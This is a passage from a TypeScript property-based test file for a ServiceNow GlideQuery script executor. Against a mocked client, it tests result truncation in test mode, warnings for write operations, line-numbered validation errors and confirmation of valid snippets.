            expect(mockClient.executeScript).toHaveBeenCalled();
            const callArgs = mockClient.executeScript.mock.calls[0][0];
            expect(callArgs.script).toBeDefined();
            // The script should be wrapped for test mode
            expect(callArgs.script).toContain('__testModeMaxResults');
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should limit results to exactly 100 records when query returns more than 100 records in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate select queries that return large result sets
          fc.record({
            table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
            recordCount: fc.integer({ min: 101, max: 500 }) // Always more than 100
          }),
          async ({ table, recordCount }) => {
            const script = `new GlideQuery('${table}').select()`;
            
            // Generate large array of records
            const records = Array.from({ length: recordCount }, (_, i) => ({
              sys_id: fc.sample(fc.hexaString({ minLength: 32, maxLength: 32 }), 1)[0],
              number: `INC${String(i).padStart(7, '0')}`,
              active: fc.sample(fc.boolean(), 1)[0],
              priority: fc.sample(fc.integer({ min: 1, max: 5 }), 1)[0]
            }));
            
            // Mock test mode response with truncation
            const mockResult = {
              __testMode: true,
              __truncated: true,
              __originalCount: recordCount,
              data: records.slice(0, 100)
            };

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute in test mode
            const result = await executor.execute(script, { testMode: true });

            // Property 16: Test mode result limiting
            // Results should be limited to exactly 100 records
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.truncated).toBe(true);
            expect(Array.isArray(result.data)).toBe(true);
            expect(result.data.length).toBe(100);
            expect(result.recordCount).toBe(100);
            
            // Verify truncation message in logs
            expect(result.logs).toBeDefined();
            expect(result.logs?.some(log => 
              log.includes('truncated') && log.includes('100') && log.includes(String(recordCount))
            )).toBe(true);
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should not truncate results when query returns 100 or fewer records in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate select queries that return small result sets
          fc.record({
            table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
            recordCount: fc.integer({ min: 0, max: 100 }) // 100 or fewer
          }),
          async ({ table, recordCount }) => {
            const script = `new GlideQuery('${table}').select()`;
            
            // Generate array of records (100 or fewer)
            const records = Array.from({ length: recordCount }, (_, i) => ({
              sys_id: fc.sample(fc.hexaString({ minLength: 32, maxLength: 32 }), 1)[0],
              number: `INC${String(i).padStart(7, '0')}`,
              active: fc.sample(fc.boolean(), 1)[0],
              priority: fc.sample(fc.integer({ min: 1, max: 5 }), 1)[0]
            }));
            
            // Mock test mode response without truncation
            const mockResult = {
              __testMode: true,
              __truncated: false,
              data: records
            };

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute in test mode
            const result = await executor.execute(script, { testMode: true });

            // Property 16: Results should NOT be truncated when 100 or fewer
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.truncated).toBe(false);
            expect(Array.isArray(result.data)).toBe(true);
            expect(result.data.length).toBe(recordCount);
            expect(result.recordCount).toBe(recordCount);
            
            // Verify no truncation message in logs
            if (result.logs && result.logs.length > 0) {
              expect(result.logs.some(log => log.includes('truncated'))).toBe(false);
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 17: Write operation warnings
  // **Validates: Requirements 4.3**
  describe('Property 17: Write operation warnings', () => {
    it('should include a warning for any script containing write operations executed in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate scripts containing various write operations
          fc.oneof(
            // Insert operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field: fc.constantFrom('short_description', 'description', 'work_notes'),
              value: fc.string({ minLength: 10, maxLength: 100 })
            }).map(({ table, field, value }) => ({
              script: `new GlideQuery('${table}').insert({ ${field}: '${value}', urgency: 3 })`,
              writeOperations: ['insert']
            })),
            
            // Update operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              whereField: fc.constantFrom('number', 'sys_id', 'active'),
              whereValue: fc.oneof(
                fc.string({ minLength: 5, maxLength: 32 }),
                fc.boolean()
              ),
              updateField: fc.constantFrom('state', 'priority', 'urgency', 'impact'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, whereField, whereValue, updateField, updateValue }) => ({
              script: `new GlideQuery('${table}').where('${whereField}', ${JSON.stringify(whereValue)}).update({ ${updateField}: ${updateValue} })`,
              writeOperations: ['update']
            })),
            
            // UpdateMultiple operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              whereField: fc.constantFrom('active', 'state', 'priority'),
              whereValue: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 })),
              updateField: fc.constantFrom('state', 'priority', 'assigned_to'),
              updateValue: fc.oneof(
                fc.integer({ min: 1, max: 7 }),
                fc.string({ minLength: 32, maxLength: 32 })
              )
            }).map(({ table, whereField, whereValue, updateField, updateValue }) => ({
              script: `new GlideQuery('${table}').where('${whereField}', ${JSON.stringify(whereValue)}).updateMultiple({ ${updateField}: ${JSON.stringify(updateValue)} })`,
              writeOperations: ['updateMultiple']
            })),
            
            // Delete operations (single)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              whereField: fc.constantFrom('sys_id', 'number'),
              whereValue: fc.string({ minLength: 10, maxLength: 32 })
            }).map(({ table, whereField, whereValue }) => ({
              script: `new GlideQuery('${table}').where('${whereField}', '${whereValue}').delete()`,
              writeOperations: ['delete']
            })),
            
            // DeleteMultiple operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              whereField: fc.constantFrom('active', 'state', 'priority'),
              whereValue: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, whereField, whereValue }) => ({
              script: `new GlideQuery('${table}').where('${whereField}', ${JSON.stringify(whereValue)}).deleteMultiple()`,
              writeOperations: ['deleteMultiple']
            })),
            
            // InsertOrUpdate operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 }),
              field: fc.constantFrom('short_description', 'priority', 'state'),
              value: fc.oneof(
                fc.string({ minLength: 10, maxLength: 50 }),
                fc.integer({ min: 1, max: 5 })
              )
            }).map(({ table, sysId, field, value }) => ({
              script: `new GlideQuery('${table}').insertOrUpdate({ sys_id: '${sysId}', ${field}: ${JSON.stringify(value)} })`,
              writeOperations: ['insertOrUpdate']
            })),
            
            // Multiple write operations in one script
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              insertDesc: fc.string({ minLength: 10, maxLength: 50 }),
              updateField: fc.constantFrom('priority', 'state'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, insertDesc, updateField, updateValue }) => ({
              script: `
                new GlideQuery('${table}').insert({ short_description: '${insertDesc}' });
                new GlideQuery('${table}').where('active', true).update({ ${updateField}: ${updateValue} });
              `,
              writeOperations: ['insert', 'update']
            })),
            
            // Write operation with select query (mixed)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              selectField: fc.constantFrom('active', 'state', 'priority'),
              selectValue: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 })),
              updateField: fc.constantFrom('priority', 'urgency'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, selectField, selectValue, updateField, updateValue }) => ({
              script: `
                new GlideQuery('${table}').where('${selectField}', ${JSON.stringify(selectValue)}).select();
                new GlideQuery('${table}').where('${selectField}', ${JSON.stringify(selectValue)}).updateMultiple({ ${updateField}: ${updateValue} });
              `,
              writeOperations: ['updateMultiple']
            })),
            
            // Case variations of write operations
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              operation: fc.constantFrom('insert', 'Insert', 'INSERT', 'update', 'Update', 'UPDATE'),
              field: fc.constantFrom('short_description', 'priority'),
              value: fc.oneof(
                fc.string({ minLength: 10, maxLength: 50 }),
                fc.integer({ min: 1, max: 5 })
              )
            }).map(({ table, operation, field, value }) => {
              const lowerOp = operation.toLowerCase();
              if (lowerOp === 'insert') {
                return {
                  script: `new GlideQuery('${table}').${operation}({ ${field}: ${JSON.stringify(value)} })`,
                  writeOperations: ['insert']
                };
              } else {
                return {
                  script: `new GlideQuery('${table}').where('active', true).${operation}({ ${field}: ${JSON.stringify(value)} })`,
                  writeOperations: ['update']
                };
              }
            }),
            
            // Write operations with modifiers
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              modifier: fc.constantFrom('disableWorkflow', 'disableAutoSysFields', 'forceUpdate'),
              updateField: fc.constantFrom('state', 'priority', 'urgency'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, modifier, updateField, updateValue }) => ({
              script: `new GlideQuery('${table}').where('active', true).${modifier}().updateMultiple({ ${updateField}: ${updateValue} })`,
              writeOperations: ['updateMultiple']
            }))
          ),
          async ({ script, writeOperations }) => {
            // Generate appropriate mock response based on write operation type
            let mockResult: any;
            
            if (writeOperations.includes('deleteMultiple') || writeOperations.includes('updateMultiple')) {
              // Bulk operations return rowCount
              mockResult = {
                rowCount: fc.sample(fc.integer({ min: 1, max: 50 }), 1)[0]
              };
            } else if (writeOperations.includes('insert') || writeOperations.includes('update') || writeOperations.includes('insertOrUpdate')) {
              // Single record operations return Optional with record
              mockResult = fc.sample(
                fc.oneof(
                  fc.record({
                    sys_id: fc.hexaString({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    short_description: fc.string({ minLength: 10, maxLength: 100 }),
                    priority: fc.integer({ min: 1, max: 5 }),
                    state: fc.integer({ min: 1, max: 7 })
                  }),
                  fc.constant(null)
                ),
                1
              )[0];
            } else {
              // Default: return empty result
              mockResult = null;
            }

            const mockResponse = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute in test mode
            const result = await executor.execute(script, { testMode: true });

            // Property 17: Write operation warnings
            // For any script containing write operations (insert, update, delete, deleteMultiple)
            // executed in test mode, the response should include a warning that changes will be persisted
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.logs).toBeDefined();
            expect(Array.isArray(result.logs)).toBe(true);
            expect(result.logs!.length).toBeGreaterThan(0);
            
            // Verify warning message is present
            const hasWarning = result.logs!.some(log => 
              log.includes('WARNING') && 
              log.includes('write operations') &&
              log.includes('persist')
            );
            expect(hasWarning).toBe(true);
            
            // Verify the warning mentions the specific write operations detected
            const warningLog = result.logs!.find(log => 
              log.includes('WARNING') && log.includes('write operations')
            );
            expect(warningLog).toBeDefined();
            
            // Check that at least one of the write operations is mentioned in the warning
            const mentionsWriteOp = writeOperations.some(op => 
              warningLog!.toLowerCase().includes(op.toLowerCase())
            );
            expect(mentionsWriteOp).toBe(true);
            
            // Verify the warning is at the beginning of the logs (unshift behavior)
            expect(result.logs![0]).toContain('WARNING');
            expect(result.logs![0]).toContain('write operations');
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should not include write operation warnings when not in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate scripts with write operations
          fc.oneof(
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('short_description', 'description'),
              value: fc.string({ minLength: 10, maxLength: 100 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').insert({ ${field}: '${value}' })`
            ),
            
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              updateField: fc.constantFrom('state', 'priority'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, updateField, updateValue }) => 
              `new GlideQuery('${table}').where('active', true).updateMultiple({ ${updateField}: ${updateValue} })`
            ),
            
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              whereField: fc.constantFrom('state', 'priority'),
              whereValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, whereField, whereValue }) => 
              `new GlideQuery('${table}').where('${whereField}', ${whereValue}).deleteMultiple()`
            )
          ),
          async (script) => {
            // Mock successful execution
            const mockResponse = {
              success: true,
              result: { rowCount: fc.sample(fc.integer({ min: 1, max: 50 }), 1)[0] },
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute WITHOUT test mode
            const result = await executor.execute(script, { testMode: false });

            // Property: Write operation warnings should NOT be present when not in test mode
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            
            // If logs exist, they should not contain write operation warnings
            if (result.logs && result.logs.length > 0) {
              const hasWarning = result.logs.some(log => 
                log.includes('WARNING') && 
                log.includes('write operations') &&
                log.includes('persist')
              );
              expect(hasWarning).toBe(false);
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should not include write operation warnings for read-only queries in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate read-only queries (no write operations)
          fc.oneof(
            // Select queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field: fc.constantFrom('active', 'state', 'priority'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`
            ),
            
            // Count queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'sys_user')
            }).map(({ table }) => 
              `new GlideQuery('${table}').count()`
            ),
            
            // SelectOne queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'sys_id'),
              value: fc.string({ minLength: 5, maxLength: 32 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`
            ),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => 
              `new GlideQuery('${table}').get('${sysId}')`
            ),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              aggregateType: fc.constantFrom('avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency')
            }).map(({ table, aggregateType, field }) => 
              `new GlideQuery('${table}').${aggregateType}('${field}')`
            )
          ),
          async (script) => {
            // Mock successful execution
            const mockResponse = {
              success: true,
              result: fc.sample(
                fc.oneof(
                  fc.array(fc.record({ sys_id: fc.string(), number: fc.string() })),
                  fc.integer({ min: 0, max: 1000 }),
                  fc.record({ sys_id: fc.string() }),
                  fc.constant(null)
                ),
                1
              )[0],
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute in test mode
            const result = await executor.execute(script, { testMode: true });

            // Property: Read-only queries should NOT have write operation warnings
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            
            // If logs exist, they should not contain write operation warnings
            if (result.logs && result.logs.length > 0) {
              const hasWarning = result.logs.some(log => 
                log.includes('WARNING') && 
                log.includes('write operations') &&
                log.includes('persist')
              );
              expect(hasWarning).toBe(false);
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 13: Error responses include line numbers
  // **Validates: Requirements 3.2**
  describe('Property 13: Error responses include line numbers', () => {
    it('should include line numbers for each syntax error found in any invalid GlideQuery snippet', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate invalid GlideQuery snippets with errors on specific lines
          fc.oneof(
            // Single-line scripts with undefined methods
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne', 'query', 'addQuery', 'next', 'getValue')
            }).map(({ table, undefinedMethod }) => ({
              script: `new GlideQuery('${table}').${undefinedMethod}()`,
              expectedLineCount: 1,
              errorType: 'undefined_method'
            })),
            
            // Multi-line scripts with errors on different lines
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              undefinedMethod1: fc.constantFrom('selectAll', 'findOne'),
              undefinedMethod2: fc.constantFrom('query', 'addQuery')
            }).map(({ table, undefinedMethod1, undefinedMethod2 }) => ({
              script: `new GlideQuery('${table}').where('active', true).${undefinedMethod1}();\nnew GlideQuery('${table}').${undefinedMethod2}();`,
              expectedLineCount: 2,
              errorType: 'multiple_undefined_methods'
            })),
            
            // Scripts with invalid operators on specific lines
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('priority', 'state', 'urgency'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OPERATOR', 'WRONG_OP')
            }).map(({ table, field, invalidOperator }) => ({
              script: `new GlideQuery('${table}')\n  .where('${field}', '${invalidOperator}', 3)\n  .select()`,
              expectedLineCount: 3,
              errorType: 'invalid_operator'
            })),
            
            // Scripts with chaining errors
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              terminalOp1: fc.constantFrom('select', 'count'),
              terminalOp2: fc.constantFrom('count', 'avg')
            }).map(({ table, terminalOp1, terminalOp2 }) => ({
              script: `new GlideQuery('${table}')\n  .${terminalOp1}()\n  .${terminalOp2}()`,
              expectedLineCount: 3,
              errorType: 'chaining_error'
            })),
            
            // Multi-line scripts with multiple errors
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OP')
            }).map(({ table, undefinedMethod, invalidOperator }) => ({
              script: `// Line 1: Comment\nnew GlideQuery('${table}')\n  .where('priority', '${invalidOperator}', 3)\n  .${undefinedMethod}()`,
              expectedLineCount: 4,
              errorType: 'multiple_errors'
            })),
            
            // Scripts with errors in having clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('assigned_to', 'caller_id'),
              invalidOperator: fc.constantFrom('INVALID', 'WRONG_OP', 'BAD')
            }).map(({ table, field, invalidOperator }) => ({
              script: `new GlideQuery('${table}')\n  .groupBy('${field}')\n  .having('COUNT', '*', '${invalidOperator}', 5)`,
              expectedLineCount: 3,
              errorType: 'invalid_operator_having'
            })),
            
            // Complex multi-line scripts with errors scattered across lines
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              undefinedMethod1: fc.constantFrom('selectAll', 'query'),
              undefinedMethod2: fc.constantFrom('findOne', 'addQuery'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OP')
            }).map(({ table, undefinedMethod1, undefinedMethod2, invalidOperator }) => ({
              script: `// Query 1\nnew GlideQuery('${table}')\n  .where('priority', '${invalidOperator}', 3)\n  .${undefinedMethod1}();\n\n// Query 2\nnew GlideQuery('${table}')\n  .${undefinedMethod2}();`,
              expectedLineCount: 8,
              errorType: 'multiple_errors_multiline'
            })),
            
            // Scripts with errors on consecutive lines
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              terminalOp1: fc.constantFrom('select', 'selectOne'),
              terminalOp2: fc.constantFrom('count', 'avg'),
              terminalOp3: fc.constantFrom('sum', 'max')
            }).map(({ table, terminalOp1, terminalOp2, terminalOp3 }) => ({
              script: `new GlideQuery('${table}').${terminalOp1}().${terminalOp2}().${terminalOp3}()`,
              expectedLineCount: 1,
              errorType: 'multiple_chaining_errors'
            })),
            
            // Scripts with errors in orWhere clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('priority', 'urgency'),
              value1: fc.integer({ min: 1, max: 5 }),
              field2: fc.constantFrom('state', 'impact'),
              invalidOperator: fc.constantFrom('INVALID', 'WRONG')
            }).map(({ table, field1, value1, field2, invalidOperator }) => ({
              script: `new GlideQuery('${table}')\n  .where('${field1}', ${value1})\n  .orWhere('${field2}', '${invalidOperator}', 2)\n  .select()`,
              expectedLineCount: 4,
              errorType: 'invalid_operator_orwhere'
            })),
            
            // Scripts with deeply nested errors
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne', 'query')
            }).map(({ table, undefinedMethod }) => ({
              script: `var query = new GlideQuery('${table}')\n  .where('active', true)\n  .where('priority', 1)\n  .orderBy('sys_created_on')\n  .${undefinedMethod}();`,
              expectedLineCount: 5,
              errorType: 'undefined_method_nested'
            }))
          ),
          async ({ script, expectedLineCount, errorType }) => {
            // Call the validate method
            const result = executor.validate(script);

            // Property 13: Error responses include line numbers
            // For any invalid GlideQuery snippet, the validation error response 
            // should include line numbers for each syntax error found
            expect(result).toBeDefined();
            
            // Should have errors (not just warnings)
            expect(result.errors).toBeDefined();
            expect(result.errors!.length).toBeGreaterThan(0);
            
            // Each error should have a line number
            for (const error of result.errors!) {
              expect(error).toBeDefined();
              expect(error.message).toBeDefined();
              expect(typeof error.message).toBe('string');
              expect(error.message.length).toBeGreaterThan(0);
              
              // Critical: Line number must be present
              expect(error.line).toBeDefined();
              expect(typeof error.line).toBe('number');
              expect(error.line).toBeGreaterThan(0);
              
              // Line number should be within the script's line count
              expect(error.line).toBeLessThanOrEqual(expectedLineCount);
            }
            
            // Verify line numbers are accurate by checking specific error types
            if (errorType === 'undefined_method') {
              // Single error on line 1
              expect(result.errors!.length).toBeGreaterThanOrEqual(1);
              const undefinedMethodError = result.errors!.find(e => 
                e.message.includes('Undefined method')
              );
              expect(undefinedMethodError).toBeDefined();
              expect(undefinedMethodError!.line).toBe(1);
              
            } else if (errorType === 'multiple_undefined_methods') {
              // Should have at least 2 errors on different lines
              expect(result.errors!.length).toBeGreaterThanOrEqual(2);
              const undefinedMethodErrors = result.errors!.filter(e => 
                e.message.includes('Undefined method')
              );
              expect(undefinedMethodErrors.length).toBeGreaterThanOrEqual(2);
              
              // Errors should be on different lines
              const lineNumbers = undefinedMethodErrors.map(e => e.line);
              const uniqueLines = new Set(lineNumbers);
              expect(uniqueLines.size).toBeGreaterThanOrEqual(2);
              
            } else if (errorType === 'invalid_operator') {
              // Error should be on line 2 (where the .where() clause is)
              const invalidOpError = result.errors!.find(e => 
                e.message.includes('Invalid operator')
              );
              expect(invalidOpError).toBeDefined();
              expect(invalidOpError!.line).toBe(2);
              
            } else if (errorType === 'chaining_error') {
              // Chaining error should be detected
              const chainingError = result.errors!.find(e => 
                e.message.includes('Cannot chain terminal operations')
              );
              expect(chainingError).toBeDefined();
              expect(chainingError!.line).toBeGreaterThan(0);
              expect(chainingError!.line).toBeLessThanOrEqual(expectedLineCount);
              
            } else if (errorType === 'multiple_errors') {
              // Should have multiple errors with different line numbers
              expect(result.errors!.length).toBeGreaterThanOrEqual(2);
              
              // All errors should have line numbers
              const allHaveLineNumbers = result.errors!.every(e => 
                e.line !== undefined && e.line > 0
              );
              expect(allHaveLineNumbers).toBe(true);
              
            } else if (errorType === 'invalid_operator_having') {
              // Error should be on line 3 (where the .having() clause is)
              const havingError = result.errors!.find(e => 
                e.message.includes('Invalid operator')
              );
              expect(havingError).toBeDefined();
              expect(havingError!.line).toBe(3);
              
            } else if (errorType === 'multiple_errors_multiline') {
              // Should have multiple errors across different lines
              expect(result.errors!.length).toBeGreaterThanOrEqual(2);
              
              // Verify line numbers are within bounds
              for (const error of result.errors!) {
                expect(error.line).toBeGreaterThan(0);
                expect(error.line).toBeLessThanOrEqual(expectedLineCount);
              }
              
            } else if (errorType === 'multiple_chaining_errors') {
              // Should have chaining errors
              const chainingErrors = result.errors!.filter(e => 
                e.message.includes('Cannot chain terminal operations')
              );
              expect(chainingErrors.length).toBeGreaterThanOrEqual(1);
              
              // All should have line numbers
              for (const error of chainingErrors) {
                expect(error.line).toBe(1); // All on same line
              }
              
            } else if (errorType === 'invalid_operator_orwhere') {
              // Error should be on line 3 (where the .orWhere() clause is)
              const orWhereError = result.errors!.find(e => 
                e.message.includes('Invalid operator')
              );
              expect(orWhereError).toBeDefined();
              expect(orWhereError!.line).toBe(3);
              
            } else if (errorType === 'undefined_method_nested') {
              // Error should be on line 5 (where the undefined method is)
              const undefinedMethodError = result.errors!.find(e => 
                e.message.includes('Undefined method')
              );
              expect(undefinedMethodError).toBeDefined();
              expect(undefinedMethodError!.line).toBe(5);
            }
            
            // Verify that line numbers are consistent and make sense
            const lineNumbers = result.errors!.map(e => e.line!);
            for (const lineNum of lineNumbers) {
              expect(lineNum).toBeGreaterThan(0);
              expect(lineNum).toBeLessThanOrEqual(expectedLineCount);
              expect(Number.isInteger(lineNum)).toBe(true);
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should provide accurate line numbers for errors in multi-line scripts', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate multi-line scripts with errors on specific, predictable lines
          fc.record({
            table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
            errorLine: fc.integer({ min: 2, max: 10 }),
            undefinedMethod: fc.constantFrom('selectAll', 'findOne', 'query', 'addQuery')
          }),
          async ({ table, errorLine, undefinedMethod }) => {
            // Build a script with the error on a specific line
            const lines: string[] = ['// Start of script'];
            
            // Add valid lines before the error
            for (let i = 1; i < errorLine - 1; i++) {
              lines.push(`// Line ${i + 1}`);
            }
            
            // Add the line with the error
            lines.push(`new GlideQuery('${table}').${undefinedMethod}()`);
            
            // Add valid lines after the error
            for (let i = errorLine; i < errorLine + 3; i++) {
              lines.push(`// Line ${i + 1}`);
            }
            
            const script = lines.join('\n');
            const expectedLineCount = lines.length;
            
            // Call the validate method
            const result = executor.validate(script);

            // Property 13: Line numbers should be accurate
            expect(result).toBeDefined();
            expect(result.errors).toBeDefined();
            expect(result.errors!.length).toBeGreaterThan(0);
            
            // Find the undefined method error
            const undefinedMethodError = result.errors!.find(e => 
              e.message.includes('Undefined method') && 
              e.message.includes(undefinedMethod)
            );
            
            expect(undefinedMethodError).toBeDefined();
            expect(undefinedMethodError!.line).toBeDefined();
            
            // The error should be on the exact line we placed it
            expect(undefinedMethodError!.line).toBe(errorLine);
            
            // Verify the line number is within the script bounds
            expect(undefinedMethodError!.line).toBeGreaterThan(0);
            expect(undefinedMethodError!.line).toBeLessThanOrEqual(expectedLineCount);
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 14: Valid snippet confirmation
  // **Validates: Requirements 3.3**
  describe('Property 14: Valid snippet confirmation', () => {
    it('should return valid=true with no errors for any syntactically valid GlideQuery snippet', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate syntactically valid GlideQuery snippets
          fc.oneof(
            // Simple select queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              field: fc.constantFrom('active', 'state', 'priority', 'urgency', 'impact'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`
            ),
            
            // Select with valid operators
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              field: fc.constantFrom('priority', 'urgency', 'impact', 'state'),
              operator: fc.constantFrom('=', '!=', '>', '>=', '<', '<=', 'IN', 'NOT IN', 'CONTAINS', 'DOES NOT CONTAIN', 'STARTSWITH', 'ENDSWITH', 'LIKE', 'NOT LIKE'),
              value: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field, operator, value }) => {
              if (operator === 'IN' || operator === 'NOT IN') {
                return `new GlideQuery('${table}').where('${field}', '${operator}', [${value}]).select()`;
              } else {
                return `new GlideQuery('${table}').where('${field}', '${operator}', ${value}).select()`;
              }
            }),
            
            // Select with valid field flags
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field: fc.constantFrom('assigned_to', 'caller_id', 'opened_by', 'resolved_by'),
              flag: fc.constantFrom('$DISPLAY', '$CURRENCY_CODE', '$CURRENCY_DISPLAY', '$CURRENCY_STRING')
            }).map(({ table, field, flag }) => 
              `new GlideQuery('${table}').select('number', '${field}${flag}')`
            ),
            
            // Count queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user')
            }).map(({ table }) => 
              `new GlideQuery('${table}').count()`
            ),
            
            // Count with where clause
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('active', 'state', 'priority'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).count()`
            ),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              aggregateType: fc.constantFrom('avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency', 'state')
            }).map(({ table, aggregateType, field }) => 
              `new GlideQuery('${table}').${aggregateType}('${field}')`
            ),
            
            // SelectOne queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field: fc.constantFrom('number', 'sys_id', 'short_description'),
              value: fc.hexaString({ minLength: 10, maxLength: 32 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`
            ),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request', 'sys_user'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => 
